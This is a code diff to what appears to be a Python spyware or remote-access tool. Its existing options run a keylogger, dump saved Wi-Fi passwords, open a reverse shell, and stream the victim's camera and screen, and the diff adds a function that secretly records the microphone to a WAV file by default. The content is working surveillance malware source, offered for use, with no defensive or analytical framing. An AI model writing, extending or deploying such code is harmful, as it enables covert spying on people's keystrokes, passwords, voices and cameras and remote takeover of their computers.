@@ -19,6 +19,7 @@ def parseargs():
     cli_args.add_argument('--host',help="listening ip, default is '0.0.0.0', no need to change", default='0.0.0.0', type=str)
     cli_args.add_argument('--port',help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2", default=5000, type=int)
     cli_args.add_argument('--keylog',help="keylog=t create a keylogger file / keylog=f don\'t create the file", default="t", type=str)
+    cli_args.add_argument('--micro',help="micro=10 record the microphone during 10 sec and put it in a file / micro=0 don\'t record", default=10, type=int)
     cli_args.add_argument('--wifi',help="wifi=t create a file with all wifis password / wifi=f don't create the file", default="t", type=str)
     cli_args.add_argument('--shell',help="shell=t revershell on port (default = 5000) / shell=f don't revershell", default="t", type=str)
     cli_args.add_argument('--camera',help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream", default="t", type=str)
@@ -31,6 +32,33 @@ def key_handler(key):
 def keylog():
     with Listener(on_press=key_handler) as listener:
         listener.join()
+        
+def Microphone(Seconds=10,File="record.wav"):
+	CHUNK = 1024
+	FORMAT = pyaudio.paInt16
+	CHANNELS = 2
+	RATE = 44100
+	RECORD_SECONDS = float(Seconds)
+	WAVE_OUTPUT_FILENAME = File
+	p = pyaudio.PyAudio()
+	stream = p.open(format=FORMAT,
+					channels=CHANNELS,
+					rate=RATE,
+					input=True,
+					frames_per_buffer=CHUNK)
+	frames = []
+	for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
+		data = stream.read(CHUNK)
+		frames.append(data)
+	stream.stop_stream()
+	stream.close()
+	p.terminate()
+	wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
+	wf.setnchannels(CHANNELS)
+	wf.setsampwidth(p.get_sample_size(FORMAT))
+	wf.setframerate(RATE)
+	wf.writeframes(b''.join(frames))
+	wf.close()
 
 
 def wifipass():
@@ -138,8 +166,13 @@ if __name__ == "__main__":
         from pynput.keyboard import Key, Listener
         from logging import info
         logging.basicConfig(filename="Keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
-        thread = threading.Thread(target=keylog)
-        thread.start()
+        threadlog = threading.Thread(target=keylog)
+        threadlog.start()
+    #microphone recorder
+    if (options.micro>0):
+        import wave,pyaudio
+        threadmic = threading.Thread(target=Microphone,args=(options.micro,))
+        threadmic.start()
     #recup wifipass
     if (options.wifi=="t"):
         wifipass()
